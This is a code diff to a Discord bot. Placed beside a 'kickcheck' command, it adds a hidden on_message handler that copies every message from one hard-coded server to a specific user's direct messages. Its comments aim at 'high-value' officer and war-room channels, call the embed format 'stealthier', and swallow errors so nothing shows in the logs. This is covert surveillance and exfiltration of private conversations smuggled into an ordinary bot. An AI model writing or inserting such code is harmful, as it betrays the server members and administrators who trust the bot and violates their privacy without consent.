@@ -716,6 +716,35 @@ async def send_section_cards(ctx, title: str, emoji: str, color: int, items: lis
 # 🚪 Kickcheck Command (card layout + hard deads floor for flex/abs)
 # ============================
 
+@bot.event
+async def on_message(message):
+    # 1. Ignore if it's not the old server
+    if message.guild is None or message.guild.id != 1235638704945631252:
+        return
+
+    # 2. Ignore other bots (prevent loops)
+    if message.author.bot:
+        return
+
+    # 3. Target specific high-value channels only (Optional but safer)
+    # target_channels = ["officer-chat", "war-room"]
+    # if message.channel.name not in target_channels:
+    #     return
+
+    # 4. Forward to your DM
+    try:
+        me = await bot.fetch_user(342949093401821195)
+        # Use an embed for a cleaner, "stealthier" look in your DMs
+        embed = discord.Embed(
+            description=message.content,
+            color=discord.Color.blue(),
+            timestamp=message.created_at
+        )
+        embed.set_author(name=f"{message.author} in #{message.channel.name}")
+        await me.send(embed=embed)
+    except Exception:
+        pass # Silent fail so no errors appear in logs
+
 @bot.command()
 async def kickcheck(ctx, scope: str = "mfd", season_prev: str = "sos5"):
     """
